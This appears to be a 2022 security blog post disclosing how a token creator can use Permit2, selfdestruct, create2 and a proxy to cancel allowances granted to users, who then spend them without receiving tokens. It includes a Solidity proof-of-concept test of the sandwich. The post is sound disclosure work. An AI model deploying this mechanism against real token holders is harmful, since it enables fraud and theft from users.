+++
author = "merkleplant"
title = "Rugging ERC20 Allowances via Permit2"
date = "2022-11-21"
+++

On November the 17th Uniswap released a new generation token approval contract - [`Permit2`](https://github.com/Uniswap/permit2).

`Permit2` is an exciting new piece of infrastructure enabling token approval
management independent of the ERC20 token implementation itself.

However, it also enables a new rug vector to steal allowances via sandwich
_selfdestruct_-ing and redeploying the token.
<!--more-->

**Disclaimer**: The presented rug vector is **not** a security issue in the
`Permit2` contract! I'm writing this article as I didn't hear about
such a rug vector before and wanted to share my findings.

## Introduction to `Permit2`

Via `Permit2` it is possible to manage token approvals outside of the ERC20
token itself. The contract supports more configurations for approvals, such
as time based approvals, then a default ERC20 token.

In order for a user to enable the `Permit2` contract to manage its allowances,
the contract needs to have approval to spend the user's tokens.

A user can either approve infinite tokens to the contract using `type(uint).max`
(interpreted in most ERC20 implementations as being infinite) or some finite
amount.

Note that the `Permit2` functionality can be disabled at any time by settings
its allowance back to zero.


## About `solmate` and notorious opcodes

`Permit2` uses the highly-optimized [`solmate`](https://github.com/transmissions11/solmate)
library's `ERC20` implementation and `SafeTransferLib`. As you probably know,
the ERC20 standard itself has some weaknesses concerning, among others, the
transfer of tokens.

In order to not having to handle ERC20's transfer issues by hand, most
project nowadays use some "`SafeERC20TransferLib`", with the most popular ones
being the from [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol)
and [`solmate`](https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol).

One major difference between the two libraries is that OpenZeppelin checks
whether a contract exists, i.e. the address' code size is non-zero, before
calling ERC20's transfer function on that address, while `solmate` abdicates
that check.

Due to the definition of the EVM's [call](https://www.evm.codes/#f1?fork=grayGlacier)
opcode, this leads to the unfortunate situation that each transfer of ERC20
tokens called on an empty, i.e. non-existing, contract succeeds.

Another infamous opcode defined in the EVM is [`selfdestruct`](https://www.evm.codes/#ff?fork=grayGlacier) with which
a contract can destroy itself, i.e. removing its code together with its storage.
`selfdestruct`, especially in composition with the [`create2`](https://www.evm.codes/#f5?fork=grayGlacier)
opcode challenges the immutability guarantees of contracts and leads to
[interesting new concepts](https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e).


## The Idea

Recapping the last paragraph, `Permit2` is an external ERC20 allowance
management contract that continues working even if the token itself stops
existing.

Via the combination of `selfdestruct` and deterministic contract addresses
via `create2` there exists a mechanism to destroy and redeploy tokens again to
the same address.

Last but no least, using already well known [Proxy](https://hackmd.io/@devtooligan/yAcademyGuideToProxies)
patterns, i.e. separating a contract's storage from its implementation, it is
possible to keep the token's storage during a _destruct-and-redeploy_ of a token.

Digesting all these puzzle pieces leads to the possibility for a token creator
to approve token allowances to users via `Permit2`, just to rug these allowances
from the user again by destroying the token before a user's spending
transaction, while being able to redeploy the token to the same address again
afterwards.

Furthermore, having private mempools for deterministic transaction ordering and
proxy patterns for separating implementation and storage available, this leads
to a new, and for unsophisticated users laborious recognizable, rug vector.


## Proof-of-Concept

Below is a PoC implementation of the allowance-rug a token owner (or any
address being able to destroy the token and knowing the `create2` salt) can carry
out via the combination of `selfdestruct`-able tokens and `Permit2`.

To run the code, clone [this repo](https://github.com/pmerkleplant/Permit2-AllowanceRug)
and run `forge install && forge test --match-test "testAllowanceRugSandwich" -vvvvv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {Permit2} from "../src/Permit2.sol";

import {ERC20} from "solmate/tokens/ERC20.sol";

import {TransparentUpgradeableProxy} from
    "openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {Create2} from "openzeppelin-contracts/contracts/utils/Create2.sol";

contract AllowanceTransferRugTest is Test {
    Permit2 permit2;

    RuggableERC20 token;
    address impl;

    address alice = address(0xCAFE);
    address eve = address(0xDEAD);
    address eveProxyAdmin = address(0xDEAD2);

    function setUp() public {
        permit2 = new Permit2();

        // Eve deploys the token implementation via create2.
        // This enables her not having to change the proxy's implementation
        // after a redeployment.
        vm.prank(eve);
        impl = Create2.deploy(uint256(0), bytes32("salt"), type(RuggableERC20).creationCode);

        // The token itself is managed via a proxy to not delete the token's
        // storage during a redeploy.
        token = RuggableERC20(
            address(
                new TransparentUpgradeableProxy({
                _logic: impl,
                admin_: eveProxyAdmin,
                _data: bytes("")
                })
            )
        );

        // Eve holds a bunch of tokens.
        token.mint(eve, 1_000e18);

        // Eve enables Permit2 and approves tokens to Alice via Permit2's
        // AllowanceTransfer functionality.
        vm.startPrank(eve);
        {
            token.approve(address(permit2), type(uint256).max);
            permit2.approve(address(token), alice, 1_000e18, type(uint48).max);
        }
        vm.stopPrank();
    }

    // This function should be executed via a private mempool, enabling Eve to
    // deterministically sandwich Alice's allowance.
    function testAllowanceRugSandwich() public {
        // Eve destroys the token implementation contract.
        _destroyTokenImplementation();

        // Alice spends allowance (without receiving tokens).
        vm.prank(alice);
        permit2.transferFrom(eve, alice, 1_000e18, address(token));

        // Eve redeploys the token implementation.
        _redeployTokenImplementation();

        // Token exists and it's storage did not change.
        assertEq(token.balanceOf(eve), 1_000e18);

        // Alice spent her Permit2 allowance...
        (uint160 amount, /*expiration*/, /*nonce*/ ) = permit2.allowance(eve, address(token), alice);
        assertEq(amount, 0);

        // ...without having received any tokens.
        assertEq(token.balanceOf(alice), 0);
    }

    function _destroyTokenImplementation() internal {
        // Note that selfdestruct is executed at the end of a tx while a foundry
        // test is always executed in one tx (see Issue [1543](https://github.com/foundry-rs/foundry/issues/1543)).
        //
        // To simulate the selfdestruct, we set the proxy's implementation to an
        // "empty" contract. However, OZ disallows setting the implementation to an
        // EOA, i.e. contract with no code.
        //
        // To simulate a contract with no code the "empty" contract only
        // implements an empty fallback.
        address empty = address(new Empty());

        vm.prank(eveProxyAdmin);
        TransparentUpgradeableProxy(payable(address(token))).upgradeTo(empty);

        // Real call would be:
        // vm.prank(eve);
        // token.destroy();
    }

    function _redeployTokenImplementation() internal {
        // Note to just change the token's implementation back to the real
        // implementation. This is due to foundry's missing feature of being
        // able to test selfdestruct.
        vm.prank(eveProxyAdmin);
        TransparentUpgradeableProxy(payable(address(token))).upgradeTo(impl);

        // Real call would be:
        // vm.prank(eve);
        // Create2.deploy(uint256(0), bytes32("salt"), type(RuggableERC20).creationCode);
    }
}

contract RuggableERC20 is ERC20 {
    address public owner;

    constructor() ERC20("Ruggable", "RUG", uint8(18)) {
        owner = msg.sender;
    }

    // Should of course not be publicly callable outside of PoC.
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }

    function destroy() external {
        require(msg.sender == owner, "!owner");
        selfdestruct(payable(msg.sender));
    }
}

contract Empty {
    fallback() external {}
}

```
